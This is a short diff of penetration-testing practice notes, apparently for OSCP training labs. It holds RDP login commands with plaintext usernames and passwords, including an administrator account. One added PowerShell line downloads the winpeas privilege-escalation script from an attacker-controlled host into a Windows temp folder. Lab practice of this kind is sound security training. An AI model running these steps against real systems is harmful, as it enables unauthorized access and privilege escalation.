@@ -57,7 +57,14 @@ xfreerdp /u:littlehelper /p:iLove5now! /v:10.10.247.111
 PowerShell Invoke-WebRequest
 
 
+get winpeas in
 
+powershell Invoke-WebRequest -Uri http://10.8.102.117:80/oscptraining/winpeas.bat -Outfile 'C:\Windows\Temp\winpeas.bat'
+
+     
+
+
+kali@kali:~/oscptraining$ xfreerdp /u:administrator /p:4q6XvFES7Fdxs /v:10.10.4.115
 
 
 
